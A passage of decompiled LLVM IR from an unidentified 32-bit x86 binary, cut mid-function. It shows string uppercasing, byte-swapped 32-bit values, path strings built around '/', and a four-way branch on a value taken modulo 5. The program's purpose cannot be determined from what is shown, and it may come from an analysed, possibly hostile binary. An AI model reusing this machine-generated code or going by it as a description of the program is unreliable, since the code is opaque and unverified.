  %v4_80482a0216 = phi i32 [ %v4_80482a0, %dec_label_pc_80482cc ], [ %v6_80481cf, %dec_label_pc_804829d.preheader ]
  %v4_80482be215 = phi i32 [ %v1_80482d3, %dec_label_pc_80482cc ], [ 0, %dec_label_pc_804829d.preheader ]
  %v3_80482b8214 = phi i8* [ %v3_80482a0.pre, %dec_label_pc_80482cc ], [ %tmp237, %dec_label_pc_804829d.preheader ]
  %v2_80482bc = add i32 %v4_80482be215, %v4_80482a0216
  %v12_80482bc = icmp eq i32 %v2_80482bc, 0
  store i1 %v12_80482bc, i1* %zf.global-to-local, align 1
  store i32 %v2_80482bc, i32* %ecx.global-to-local, align 4
  %v1_80482be = inttoptr i32 %v2_80482bc to i8*
  %v2_80482be = load i8, i8* %v1_80482be, align 1
  %v3_80482be = zext i8 %v2_80482be to i32
  %v5_80482be = and i32 %v4_80482be215, -256
  %v6_80482be = or i32 %v3_80482be, %v5_80482be
  store i32 %v6_80482be, i32* %edx.global-to-local, align 4
  %v1_80482c0 = add i32 %v6_80482be, -97
  store i32 %v1_80482c0, i32* %eax.global-to-local, align 4
  %v1_80482c3 = trunc i32 %v1_80482c0 to i8
  %v11_80482c3 = icmp eq i8 %v1_80482c3, 25
  store i1 %v11_80482c3, i1* %zf.global-to-local, align 1
  %v8_80482c5 = icmp ugt i8 %v1_80482c3, 25
  br i1 %v8_80482c5, label %dec_label_pc_80482cc, label %dec_label_pc_80482c7

dec_label_pc_80482c7:                             ; preds = %dec_label_pc_80482b8
  %v1_80482c7 = add i32 %v6_80482be, -32
  store i32 %v1_80482c7, i32* %eax.global-to-local, align 4
  %v1_80482ca = trunc i32 %v1_80482c7 to i8
  store i8 %v1_80482ca, i8* %v1_80482be, align 1
  %v0_804829d.pre.pre = load i32, i32* @esp, align 4
  %v3_80482a0.pre.pre = load i8*, i8** %stack_var_-20900, align 4
  br label %dec_label_pc_80482cc

dec_label_pc_80482cc:                             ; preds = %dec_label_pc_80482b8, %dec_label_pc_80482c7
  %v3_80482a0.pre = phi i8* [ %v3_80482b8214, %dec_label_pc_80482b8 ], [ %v3_80482a0.pre.pre, %dec_label_pc_80482c7 ]
  %v0_804829d.pre = phi i32 [ %v15_8048194, %dec_label_pc_80482b8 ], [ %v0_804829d.pre.pre, %dec_label_pc_80482c7 ]
  %v1_80482d3 = add i32 %v4_80482be215, 1
  %v9_804829d = icmp eq i32 %v0_804829d.pre, 12
  store i1 %v9_804829d, i1* %zf.global-to-local, align 1
  %v4_80482a0 = ptrtoint i8* %v3_80482a0.pre to i32
  store i32 %v4_80482a0, i32* %eax.global-to-local, align 4
  store i32 %v4_80482a0, i32* %stack_var_-20972, align 4
  %v2_80482a5 = call i32 @function_8052620(i8* %v3_80482a0.pre)
  store i32 %v2_80482a5, i32* %eax.global-to-local, align 4
  store i32 %v1_80482d3, i32* %edx.global-to-local, align 4
  %v12_80482b4 = icmp eq i32 %v2_80482a5, %v1_80482d3
  store i1 %v12_80482b4, i1* %zf.global-to-local, align 1
  %v7_80482b6 = icmp sgt i32 %v2_80482a5, %v1_80482d3
  br i1 %v7_80482b6, label %dec_label_pc_80482b8, label %dec_label_pc_80482dd

dec_label_pc_80482dd:                             ; preds = %dec_label_pc_80482cc, %dec_label_pc_804829d.preheader
  %v0_80482dd = load i32, i32* @edi, align 4
  %v7_80482e7 = icmp sgt i32 %v0_80482dd, 256
  %.v0_80482dd = select i1 %v7_80482e7, i32 256, i32 %v0_80482dd
  store i1 %v9_8048246, i1* %zf.global-to-local, align 1
  store i32 36, i32* %stack_var_-20972, align 4
  %v2_80482f6 = call i32 @function_8051cd0(i8 36)
  store i32 %v2_80482f6, i32* %eax.global-to-local, align 4
  store i32 37, i32* %stack_var_-20972, align 4
  %v2_8048302 = call i32 @function_8051cd0(i8 37)
  store i32 %v2_8048302, i32* %eax.global-to-local, align 4
  store i32 38, i32* %stack_var_-20972, align 4
  %v2_804830e = call i32 @function_8051cd0(i8 38)
  store i32 %v2_804830e, i32* %eax.global-to-local, align 4
  store i32 39, i32* %stack_var_-20972, align 4
  %v2_804831a = call i32 @function_8051cd0(i8 39)
  store i32 %v2_804831a, i32* %eax.global-to-local, align 4
  store i32 40, i32* %stack_var_-20972, align 4
  %v2_8048326 = call i32 @function_8051cd0(i8 40)
  store i32 %v2_8048326, i32* %eax.global-to-local, align 4
  store i32 41, i32* %stack_var_-20972, align 4
  %v2_8048332 = call i32 @function_8051cd0(i8 41)
  store i32 %v2_8048332, i32* %eax.global-to-local, align 4
  store i32 42, i32* %stack_var_-20972, align 4
  %v2_804833e = call i32 @function_8051cd0(i8 42)
  store i32 %v2_804833e, i32* %eax.global-to-local, align 4
  store i32 43, i32* %stack_var_-20972, align 4
  %v2_804834a = call i32 @function_8051cd0(i8 43)
  store i32 %v2_804834a, i32* %eax.global-to-local, align 4
  store i32 44, i32* %stack_var_-20972, align 4
  %v2_8048356 = call i32 @function_8051cd0(i8 44)
  store i32 %v2_8048356, i32* %eax.global-to-local, align 4
  store i32 45, i32* %stack_var_-20972, align 4
  %v2_8048362 = call i32 @function_8051cd0(i8 45)
  store i32 %v2_8048362, i32* %eax.global-to-local, align 4
  store i32 46, i32* %stack_var_-20972, align 4
  %v2_804836e = call i32 @function_8051cd0(i8 46)
  %v2_8048373 = load i32, i32* %stack_var_-20972, align 4
  store i32 %v2_8048373, i32* @edi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %.v0_80482dd, i32* @esi, align 4
  store i32 %.v0_80482dd, i32* %stack_var_-20972, align 4
  %v2_804837f = sext i32 %.v0_80482dd to i64
  %v3_804837f = call i32 @function_8053cc8(i64 %v2_804837f, i32 3140)
  store i32 %v3_804837f, i32* %eax.global-to-local, align 4
  store i32 %v3_804837f, i32* @esi, align 4
  store i32 %.v0_80482dd, i32* @ebx, align 4
  %v1_8048391 = icmp eq i32 %.v0_80482dd, 0
  store i1 %v1_8048391, i1* %zf.global-to-local, align 1
  %tmp136 = icmp slt i32 %.v0_80482dd, 1
  br i1 %tmp136, label %dec_label_pc_80484be, label %dec_label_pc_8048399

dec_label_pc_8048399:                             ; preds = %dec_label_pc_80482dd
  %v0_8048399 = load i32, i32* @ebp, align 4
  %v1_8048399 = trunc i32 %v0_8048399 to i8
  store i32 0, i32* @ebp, align 4
  %v1_804839d5 = urem i32 %v0_8048399, 256
  %v3_804839d = icmp eq i8 %v1_8048399, 0
  store i1 %v3_804839d, i1* %zf.global-to-local, align 1
  store i32 %v1_804839d5, i32* @ecx, align 4
  %v2_80483e1 = inttoptr i32 %v1_804839d5 to i8*
  %v2_8049f7d = inttoptr i32 %tmp to i8*
  %v1_8049f3f = trunc i32 %tmp to i8
  %v2_804a072 = inttoptr i32 %v0_804816e to i32*
  br label %dec_label_pc_80483a7

dec_label_pc_80483a7:                             ; preds = %dec_label_pc_8049f6a.dec_label_pc_80483a7_crit_edge, %dec_label_pc_8048399
  %v0_80483a9 = phi i32 [ %v0_80483a9.pre, %dec_label_pc_8049f6a.dec_label_pc_80483a7_crit_edge ], [ %v3_804837f, %dec_label_pc_8048399 ]
  %v0_80483a7 = phi i32 [ %v4_8049f85, %dec_label_pc_8049f6a.dec_label_pc_80483a7_crit_edge ], [ 0, %dec_label_pc_8048399 ]
  store i32 %v0_80483a7, i32* %edx.global-to-local, align 4
  %v1_80483a9 = add i32 %v0_80483a9, 4
  %v2_80483a9 = inttoptr i32 %v1_80483a9 to i8*
  store i8 0, i8* %v2_80483a9, align 1
  %v0_80483ad = load i32, i32* %edx.global-to-local, align 4
  %v2_80483ad = ashr i32 %v0_80483ad, 31
  %v3_80483ad = icmp eq i32 %v2_80483ad, 0
  store i1 %v3_80483ad, i1* %zf.global-to-local, align 1
  store i32 %v2_80483ad, i32* %edx.global-to-local, align 4
  %v0_80483b0 = load i32, i32* @ebp, align 4
  store i32 %v0_80483b0, i32* %eax.global-to-local, align 4
  %v0_80483b2 = load i32, i32* @esp, align 4
  %v1_80483b2 = add i32 %v0_80483b2, 88
  %v2_80483b2 = inttoptr i32 %v1_80483b2 to i32*
  %v3_80483b2 = load i32, i32* %v2_80483b2, align 4
  %v5_80483b2 = zext i32 %v0_80483b0 to i64
  %v7_80483b2 = zext i32 %v2_80483ad to i64
  %v8_80483b2 = mul nuw i64 %v7_80483b2, 4294967296
  %v9_80483b2 = or i64 %v5_80483b2, %v8_80483b2
  %v10_80483b2 = zext i32 %v3_80483b2 to i64
  %v11_80483b2 = sdiv i64 %v9_80483b2, %v10_80483b2
  %v12_80483b2 = trunc i64 %v11_80483b2 to i32
  store i32 %v12_80483b2, i32* %eax.global-to-local, align 4
  %v13_80483b2 = srem i64 %v9_80483b2, %v10_80483b2
  %v14_80483b2 = trunc i64 %v13_80483b2 to i32
  store i32 %v14_80483b2, i32* %edx.global-to-local, align 4
  %v1_80483b6 = add i32 %v0_80483b2, 20932
  %v2_80483b6 = inttoptr i32 %v1_80483b6 to i32*
  %v3_80483b6 = load i32, i32* %v2_80483b6, align 4
  store i32 %v3_80483b6, i32* %eax.global-to-local, align 4
  %v0_80483bd = load i32, i32* @esi, align 4
  %v1_80483bd = inttoptr i32 %v0_80483bd to i32*
  store i32 -1, i32* %v1_80483bd, align 4
  %v0_80483c3 = load i32, i32* %edx.global-to-local, align 4
  %v0_80483c6 = load i32, i32* %eax.global-to-local, align 4
  %v2_80483c6 = mul i32 %v0_80483c3, 24
  %v3_80483c6 = add i32 %v0_80483c6, %v2_80483c6
  store i32 %v3_80483c6, i32* @edi, align 4
  %v0_80483c9 = load i32, i32* @esi, align 4
  %v1_80483c9 = add i32 %v0_80483c9, 532
  store i32 %v1_80483c9, i32* %edx.global-to-local, align 4
  %v1_80483cf = load i32, i32* @esp, align 4
  %v2_80483cf = add i32 %v1_80483cf, 36
  %v3_80483cf = inttoptr i32 %v2_80483cf to i32*
  store i32 %v1_80483c9, i32* %v3_80483cf, align 4
  %v0_80483d3 = load i32, i32* @edi, align 4
  %v1_80483d3 = add i32 %v0_80483d3, 16
  %v2_80483d3 = inttoptr i32 %v1_80483d3 to i32*
  %v3_80483d3 = load i32, i32* %v2_80483d3, align 4
  store i32 %v3_80483d3, i32* %eax.global-to-local, align 4
  %v1_80483d6 = load i32, i32* @esi, align 4
  %v2_80483d6 = add i32 %v1_80483d6, 16
  %v3_80483d6 = inttoptr i32 %v2_80483d6 to i32*
  store i32 %v3_80483d3, i32* %v3_80483d6, align 4
  %v0_80483d9 = load i32, i32* @ecx, align 4
  %v1_80483d9 = load i32, i32* @esp, align 4
  %v2_80483d9 = add i32 %v1_80483d9, -4
  %v3_80483d9 = inttoptr i32 %v2_80483d9 to i32*
  store i32 %v0_80483d9, i32* %v3_80483d9, align 4
  %v0_80483da = load i32, i32* @ecx, align 4
  %v2_80483da = add i32 %v1_80483d9, -8
  %v3_80483da = inttoptr i32 %v2_80483da to i32*
  store i32 %v0_80483da, i32* %v3_80483da, align 4
  %v1_80483db = add i32 %v1_80483d9, 64
  %v2_80483db = inttoptr i32 %v1_80483db to i32*
  %v3_80483db = load i32, i32* %v2_80483db, align 4
  store i32 %v3_80483db, i32* %eax.global-to-local, align 4
  %v2_80483df = add i32 %v1_80483d9, -12
  %v3_80483df = inttoptr i32 %v2_80483df to i32*
  store i32 %v3_80483db, i32* %v3_80483df, align 4
  %v0_80483e0 = load i32, i32* %edx.global-to-local, align 4
  %v2_80483e0 = add i32 %v1_80483d9, -16
  %v3_80483e0 = inttoptr i32 %v2_80483e0 to i32*
  store i32 %v0_80483e0, i32* %v3_80483e0, align 4
  %v3_80483e1 = call i32 @function_8052640(i8* %v2_80483e1, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80483e1, i32* %eax.global-to-local, align 4
  %v0_80483e6 = load i32, i32* @esp, align 4
  %v1_80483e6 = add i32 %v0_80483e6, 16
  %v6_80483e6 = icmp eq i32 %v1_80483e6, 0
  store i1 %v6_80483e6, i1* %zf.global-to-local, align 1
  %v0_80483e9 = load i32, i32* @esi, align 4
  %v1_80483e9 = add i32 %v0_80483e9, 532
  %v2_80483e9 = inttoptr i32 %v1_80483e9 to i8*
  %v3_80483e9 = load i8, i8* %v2_80483e9, align 1
  %v12_80483e9 = icmp eq i8 %v3_80483e9, 47
  store i1 %v12_80483e9, i1* %zf.global-to-local, align 1
  br i1 %v12_80483e9, label %dec_label_pc_804841e, label %dec_label_pc_80483f2

dec_label_pc_80483f2:                             ; preds = %dec_label_pc_80483a7
  %v9_80483f2 = icmp eq i32 %v0_80483e6, -4
  store i1 %v9_80483f2, i1* %zf.global-to-local, align 1
  %v1_80483f5 = add i32 %v0_80483e6, 52
  %v2_80483f5 = inttoptr i32 %v1_80483f5 to i32*
  %v3_80483f5 = load i32, i32* %v2_80483f5, align 4
  store i32 %v3_80483f5, i32* %eax.global-to-local, align 4
  %v3_80483f9 = inttoptr i32 %v0_80483e6 to i32*
  store i32 %v3_80483f5, i32* %v3_80483f9, align 4
  %v2_80483fa = call i32 @function_8052620(i8* %v2_80483e1)
  store i32 %v2_80483fa, i32* %eax.global-to-local, align 4
  %v0_80483ff = load i32, i32* @esp, align 4
  %v9_80483ff = icmp eq i32 %v0_80483ff, -12
  store i1 %v9_80483ff, i1* %zf.global-to-local, align 1
  %v2_8048402 = add i32 %v0_80483ff, 8
  %v3_8048402 = inttoptr i32 %v2_8048402 to i32*
  store i32 %v2_80483fa, i32* %v3_8048402, align 4
  %v1_8048403 = add i32 %v0_80483ff, 52
  %v2_8048403 = inttoptr i32 %v1_8048403 to i32*
  %v3_8048403 = load i32, i32* %v2_8048403, align 4
  %v2_8048407 = add i32 %v0_80483ff, 4
  %v3_8048407 = inttoptr i32 %v2_8048407 to i32*
  store i32 %v3_8048403, i32* %v3_8048407, align 4
  %v0_8048408 = load i32, i32* @esi, align 4
  %v1_8048408 = add i32 %v0_8048408, 533
  store i32 %v1_8048408, i32* %eax.global-to-local, align 4
  %v3_804840e = inttoptr i32 %v0_80483ff to i32*
  store i32 %v1_8048408, i32* %v3_804840e, align 4
  %v4_804840f = call i32 @function_8053123(i8* %v2_80483e1, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804840f, i32* %eax.global-to-local, align 4
  %v0_8048414 = load i32, i32* @esi, align 4
  %v1_8048414 = add i32 %v0_8048414, 532
  %v2_8048414 = inttoptr i32 %v1_8048414 to i8*
  store i8 47, i8* %v2_8048414, align 1
  %v0_804841b = load i32, i32* @esp, align 4
  %v1_804841b = add i32 %v0_804841b, 16
  %v6_804841b = icmp eq i32 %v1_804841b, 0
  store i1 %v6_804841b, i1* %zf.global-to-local, align 1
  %v0_804841e.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804841e

dec_label_pc_804841e:                             ; preds = %dec_label_pc_80483a7, %dec_label_pc_80483f2
  %v1_804841e = phi i32 [ %v1_80483e6, %dec_label_pc_80483a7 ], [ %v1_804841b, %dec_label_pc_80483f2 ]
  %v0_804841e = phi i32 [ %v3_80483e1, %dec_label_pc_80483a7 ], [ %v0_804841e.pre, %dec_label_pc_80483f2 ]
  %v2_804841e = add i32 %v1_804841e, -4
  %v3_804841e = inttoptr i32 %v2_804841e to i32*
  store i32 %v0_804841e, i32* %v3_804841e, align 4
  %v0_804841f = load i32, i32* %eax.global-to-local, align 4
  %v2_804841f = add i32 %v1_804841e, -8
  %v3_804841f = inttoptr i32 %v2_804841f to i32*
  store i32 %v0_804841f, i32* %v3_804841f, align 4
  %v1_8048420 = add i32 %v1_804841e, 56
  %v2_8048420 = inttoptr i32 %v1_8048420 to i32*
  %v3_8048420 = load i32, i32* %v2_8048420, align 4
  %v2_8048424 = add i32 %v1_804841e, -12
  %v3_8048424 = inttoptr i32 %v2_8048424 to i32*
  store i32 %v3_8048420, i32* %v3_8048424, align 4
  %v0_8048425 = load i32, i32* @esi, align 4
  %v1_8048425 = add i32 %v0_8048425, 1440
  store i32 %v1_8048425, i32* %eax.global-to-local, align 4
  %v2_804842b = add i32 %v1_804841e, -16
  %v3_804842b = inttoptr i32 %v2_804842b to i32*
  store i32 %v1_8048425, i32* %v3_804842b, align 4
  %v3_804842c = call i32 @function_8052640(i8* %v2_80483e1, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804842c, i32* %eax.global-to-local, align 4
  %v0_8048431 = load i32, i32* @esp, align 4
  %v1_8048431 = inttoptr i32 %v0_8048431 to i32*
  %v2_8048431 = load i32, i32* %v1_8048431, align 4
  store i32 %v2_8048431, i32* @ebx, align 4
  %v0_8048433 = load i32, i32* @esi, align 4
  %v1_8048433 = add i32 %v0_8048433, 1431
  store i32 %v1_8048433, i32* %eax.global-to-local, align 4
  %v1_8048439 = add i32 %v0_8048431, 72
  %v2_8048439 = inttoptr i32 %v1_8048439 to i32*
  %v3_8048439 = load i32, i32* %v2_8048439, align 4
  store i32 %v3_8048439, i32* %ecx.global-to-local, align 4
  %v2_804843d = add i32 %v0_8048431, 4
  %v3_804843d = inttoptr i32 %v2_804843d to i32*
  store i32 %v3_8048439, i32* %v3_804843d, align 4
  %v0_804843e = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_804843e, i32* %v1_8048431, align 4
  %v3_804843f = call i32 @function_8052640(i8* %v2_80483e1, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804843f, i32* %eax.global-to-local, align 4
  %v0_8048444 = load i32, i32* @esp, align 4
  %v1_8048444 = inttoptr i32 %v0_8048444 to i32*
  %v2_8048444 = load i32, i32* %v1_8048444, align 4
  store i32 %v2_8048444, i32* %eax.global-to-local, align 4
  %v3_8048444 = add i32 %v0_8048444, 4
  %v1_8048445 = inttoptr i32 %v3_8048444 to i32*
  %v2_8048445 = load i32, i32* %v1_8048445, align 4
  store i32 %v2_8048445, i32* %edx.global-to-local, align 4
  %v1_8048446 = add i32 %v0_8048444, 76
  %v2_8048446 = inttoptr i32 %v1_8048446 to i32*
  %v3_8048446 = load i32, i32* %v2_8048446, align 4
  store i32 %v3_8048446, i32* %v1_8048445, align 4
  %v0_804844b = load i32, i32* @esi, align 4
  %v1_804844b = add i32 %v0_804844b, 789
  store i32 %v1_804844b, i32* %eax.global-to-local, align 4
  store i32 %v1_804844b, i32* %v1_8048444, align 4
  %v3_8048452 = call i32 @function_8052640(i8* %v2_80483e1, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048452, i32* %eax.global-to-local, align 4
  %v0_8048457 = load i32, i32* @esp, align 4
  %v6_8048457 = icmp eq i32 %v0_8048457, -16
  store i1 %v6_8048457, i1* %zf.global-to-local, align 1
  %v0_804845a = load i32, i32* @edi, align 4
  %v1_804845a = add i32 %v0_804845a, 20
  %v2_804845a = inttoptr i32 %v1_804845a to i8*
  %v3_804845a = load i8, i8* %v2_804845a, align 1
  %v12_804845a = icmp eq i8 %v3_804845a, 31
  store i1 %v12_804845a, i1* %zf.global-to-local, align 1
  %tmp238 = icmp ult i8 %v3_804845a, 32
  br i1 %tmp238, label %dec_label_pc_8048460, label %dec_label_pc_804848a

dec_label_pc_8048460:                             ; preds = %dec_label_pc_804841e
  %v1_8048460 = add i32 %v0_804845a, 16
  %v2_8048460 = inttoptr i32 %v1_8048460 to i32*
  %v3_8048460 = load i32, i32* %v2_8048460, align 4
  store i32 %v3_8048460, i32* %ebx.global-to-local, align 4
  %v1_8048463 = call i32 @function_804fa40(i32 %v1_804839d5)
  store i32 %v1_8048463, i32* %eax.global-to-local, align 4
  %v1_8048468 = trunc i32 %v3_8048460 to i16
  %v2_8048468 = call i16 @llvm.bswap.i16(i16 %v1_8048468)
  %v3_8048468 = zext i16 %v2_8048468 to i32
  %v1_804846c = udiv i32 %v3_8048460, 65536
  %v2_804846c = mul nuw i32 %v3_8048468, 65536
  %v1_804846f = trunc i32 %v1_804846c to i16
  %v2_804846f = call i16 @llvm.bswap.i16(i16 %v1_804846f)
  %v3_804846f = zext i16 %v2_804846f to i32
  %v6_804846f = or i32 %v3_804846f, %v2_804846c
  store i32 %v6_804846f, i32* %ebx.global-to-local, align 4
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %ecx.global-to-local, align 4
  %v0_8048475 = load i32, i32* @edi, align 4
  %v1_8048475 = add i32 %v0_8048475, 20
  %v2_8048475 = inttoptr i32 %v1_8048475 to i8*
  %v3_8048475 = load i8, i8* %v2_8048475, align 1
  %v4_8048475 = zext i8 %v3_8048475 to i32
  store i32 %v4_8048475, i32* %ecx.global-to-local, align 4
  %tmp242 = urem i8 %v3_8048475, 32
  %v4_8048478 = icmp eq i8 %tmp242, 0
  br i1 %v4_8048478, label %bb137, label %bb

bb:                                               ; preds = %dec_label_pc_8048460
  %v2_8048478 = zext i8 %tmp242 to i32
  %v5_8048478 = lshr i32 %v1_8048463, %v2_8048478
  %v6_8048478 = icmp eq i32 %v5_8048478, 0
  store i1 %v6_8048478, i1* %zf.global-to-local, align 1
  store i32 %v5_8048478, i32* %eax.global-to-local, align 4
  br label %bb137

bb137:                                            ; preds = %dec_label_pc_8048460, %bb
  %v0_804847a = phi i32 [ %v1_8048463, %dec_label_pc_8048460 ], [ %v5_8048478, %bb ]
  %v2_804847a = add i32 %v0_804847a, %v6_804846f
  %v12_804847a = icmp eq i32 %v2_804847a, 0
  store i1 %v12_804847a, i1* %zf.global-to-local, align 1
  %v1_804847c = trunc i32 %v2_804847a to i16
  %v2_804847c = call i16 @llvm.bswap.i16(i16 %v1_804847c)
  %v3_804847c = zext i16 %v2_804847c to i32
  %v1_8048480 = udiv i32 %v2_804847a, 65536
  %v2_8048480 = mul nuw i32 %v3_804847c, 65536
  %v1_8048483 = trunc i32 %v1_8048480 to i16
  %v2_8048483 = call i16 @llvm.bswap.i16(i16 %v1_8048483)
  %v3_8048483 = zext i16 %v2_8048483 to i32
  %v6_8048483 = or i32 %v3_8048483, %v2_8048480
  store i32 %v6_8048483, i32* %eax.global-to-local, align 4
  %v1_8048487 = load i32, i32* @esi, align 4
  %v2_8048487 = add i32 %v1_8048487, 16
  %v3_8048487 = inttoptr i32 %v2_8048487 to i32*
  store i32 %v6_8048483, i32* %v3_8048487, align 4
  br label %dec_label_pc_804848a

dec_label_pc_804848a:                             ; preds = %dec_label_pc_804841e, %bb137
  %v1_804848a = call i32 @function_804fa40(i32 %v1_804839d5)
  %v2_804848a = sext i32 %v1_804848a to i64
  store i32 -858993459, i32* @ecx, align 4
  store i32 %v1_804848a, i32* @ebx, align 4
  %v5_8048496 = mul nuw nsw i64 %v2_804848a, 3435973837
  %v6_8048496 = trunc i64 %v5_8048496 to i32
  %v7_8048496 = udiv i64 %v5_8048496, 4294967296
  %v8_8048496 = trunc i64 %v7_8048496 to i32
  store i32 %v6_8048496, i32* %eax.global-to-local, align 4
  store i32 %v8_8048496, i32* %edx.global-to-local, align 4
  %v1_8048498 = load i32, i32* @esp, align 4
  %v2_8048498 = add i32 %v1_8048498, 12
  %v3_8048498 = inttoptr i32 %v2_8048498 to i32*
  store i32 %v8_8048496, i32* %v3_8048498, align 4
  %v0_804849c = load i32, i32* %eax.global-to-local, align 4
  %v1_804849c = load i32, i32* @esp, align 4
  %v2_804849c = add i32 %v1_804849c, 8
  %v3_804849c = inttoptr i32 %v2_804849c to i32*
  store i32 %v0_804849c, i32* %v3_804849c, align 4
  %v0_80484a0 = load i32, i32* @esp, align 4
  %v1_80484a0 = add i32 %v0_80484a0, 12
  %v2_80484a0 = inttoptr i32 %v1_80484a0 to i32*
  %v3_80484a0 = load i32, i32* %v2_80484a0, align 4
  %v0_80484a4 = load i32, i32* @ebx, align 4
  %v2_80484a6 = udiv i32 %v3_80484a0, 4
  %v3_80484a9 = mul i32 %v2_80484a6, 5
  store i32 %v3_80484a9, i32* %edx.global-to-local, align 4
  %v2_80484ac = sub i32 %v0_80484a4, %v3_80484a9
  store i32 %v2_80484ac, i32* %eax.global-to-local, align 4
  %v9_80484ae = icmp eq i32 %v2_80484ac, 4
  store i1 %v9_80484ae, i1* %zf.global-to-local, align 1
  switch i32 %v2_80484ac, label %dec_label_pc_8049f6a [
    i32 0, label %dec_label_pc_8049f3a
    i32 1, label %dec_label_pc_8049fc3
    i32 2, label %dec_label_pc_8049ff8
    i32 3, label %dec_label_pc_804a062
  ]

dec_label_pc_80484be:                             ; preds = %dec_label_pc_80482dd
  %v1_80484be = add i32 %v3_804837f, 16
  store i32 %v1_80484be, i32* %edx.global-to-local, align 4
  %v2_80484c1 = ptrtoint i32* %stack_var_-216 to i32
  store i32 %v2_80484c1, i32* %ecx.global-to-local, align 4
  %v2_80484c8 = ptrtoint i32* %stack_var_-344 to i32
  store i32 %v2_80484c8, i32* %eax.global-to-local, align 4
  %v1_80484cf = add i32 %v3_804837f, 1452
  %v9_80484cf = icmp eq i32 %v1_80484cf, 0
  store i1 %v9_80484cf, i1* %zf.global-to-local, align 1
  store i32 %v1_80484cf, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80484e5.preheader

dec_label_pc_80484e5.preheader:                   ; preds = %dec_label_pc_80484be, %dec_label_pc_8049f8f
  %v0_80484e5.pre = phi i32 [ %v0_80484e5.pre.pre, %dec_label_pc_8049f8f ], [ %v15_8048194, %dec_label_pc_80484be ]
  %stack_var_-20924.0.ph = phi i32 [ %tmp, %dec_label_pc_8049f8f ], [ %v1_80484cf, %dec_label_pc_80484be ]
  %v1_80484ea = inttoptr i32 %stack_var_-20924.0.ph to i32*
  %v1_8048752 = inttoptr i32 %stack_var_-20924.0.ph to i8*
  %v1_804887b = trunc i32 %stack_var_-20924.0.ph to i8
  %v3_8048aab = sext i32 %stack_var_-20924.0.ph to i64
  br label %dec_label_pc_80484e5

dec_label_pc_80484e5:                             ; preds = %dec_label_pc_8048ce9, %dec_label_pc_8048cdd, %dec_label_pc_80484e5, %dec_label_pc_8048d91, %dec_label_pc_80484e5.preheader
  %v0_80484e5 = phi i32 [ %v0_80484e5.pre, %dec_label_pc_80484e5.preheader ], [ %v1_804850c, %dec_label_pc_80484e5 ], [ %v0_8048597, %dec_label_pc_8048cdd ], [ %v1_8048d39, %dec_label_pc_8048ce9 ], [ %v0_8048da7, %dec_label_pc_8048d91 ]
  %v9_80484e5 = icmp eq i32 %v0_80484e5, 12
  store i1 %v9_80484e5, i1* %zf.global-to-local, align 1
  %v1_80484e8 = add i32 %v0_80484e5, -16
  %v2_80484e8 = inttoptr i32 %v1_80484e8 to i32*
  store i32 0, i32* %v2_80484e8, align 4
  %v2_80484ea = call i32 @function_8052e82(i32* %v1_80484ea)
  store i32 32, i32* %edx.global-to-local, align 4
  %v1_80484f4 = load i32, i32* @esp, align 4
  %v2_80484f4 = add i32 %v1_80484f4, 96
  %v3_80484f4 = inttoptr i32 %v2_80484f4 to i32*
  store i32 %v2_80484ea, i32* %v3_80484f4, align 4
  %v0_80484f8 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_80484f8, i32* %ecx.global-to-local, align 4
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_80484fc = load i32, i32* @esp, align 4
  %v1_80484fc = add i32 %v0_80484fc, 40
  %v2_80484fc = inttoptr i32 %v1_80484fc to i32*
  %v3_80484fc = load i32, i32* %v2_80484fc, align 4
  %v4_80484fc = inttoptr i32 %v3_80484fc to i8*
  store i32 %v3_80484fc, i32* %edi.global-to-local, align 4
  %v5_8048501 = call i8* @_memset(i8* %v4_80484fc, i32 0, i32 %v0_80484f8)
  %v0_8048503 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_8048503, i32* %ecx.global-to-local, align 4
  %v0_8048505 = load i32, i32* @esp, align 4
  %v1_8048505 = add i32 %v0_8048505, 36
  %v2_8048505 = inttoptr i32 %v1_8048505 to i32*
  %v3_8048505 = load i32, i32* %v2_8048505, align 4
  %v4_8048505 = inttoptr i32 %v3_8048505 to i8*
  store i32 %v3_8048505, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v2_804850a = load i32, i32* %eax.global-to-local, align 4
  %v5_804850a = call i8* @_memset(i8* %v4_8048505, i32 %v2_804850a, i32 %v0_8048503)
  %v6_804850a = ptrtoint i8* %v5_804850a to i32
  store i32 %v6_804850a, i32* @ecx, align 4
  %v0_804850c = load i32, i32* @esp, align 4
  %v1_804850c = add i32 %v0_804850c, 16
  %v1_804850f = add i32 %v0_804850c, 128
  %v2_804850f = inttoptr i32 %v1_804850f to i32*
  %v3_804850f = load i32, i32* %v2_804850f, align 4
  store i32 %v3_804850f, i32* %esi.global-to-local, align 4
  %v1_8048513 = icmp eq i32 %v3_804850f, 0
  store i1 %v1_8048513, i1* %zf.global-to-local, align 1
  %tmp138 = icmp slt i32 %v3_804850f, 1
  br i1 %tmp138, label %dec_label_pc_80484e5, label %dec_label_pc_8048517

dec_label_pc_8048517:                             ; preds = %dec_label_pc_80484e5
  %v1_8048517 = add i32 %v0_804850c, 64
  %v2_8048517 = inttoptr i32 %v1_8048517 to i32*
  %v3_8048517 = load i32, i32* %v2_8048517, align 4
  store i32 %v3_8048517, i32* %esi.global-to-local, align 4
  %v1_804851b = add i32 %v0_804850c, 44
  %v2_804851b = inttoptr i32 %v1_804851b to i32*
  %v3_804851b = load i32, i32* %v2_804851b, align 4
  store i32 %v3_804851b, i32* @ebp, align 4
  %v1_804851f = add i32 %v3_8048517, 1440
  %v6_804851f = icmp eq i32 %v1_804851f, 0
  store i1 %v6_804851f, i1* %zf.global-to-local, align 1
  store i32 %v1_804851f, i32* @esi, align 4
  %v1_8048525 = add i32 %v0_804850c, 116
  %v2_8048525 = inttoptr i32 %v1_8048525 to i32*
  store i32 0, i32* %v2_8048525, align 4
  %v0_804852d = load i32, i32* @esp, align 4
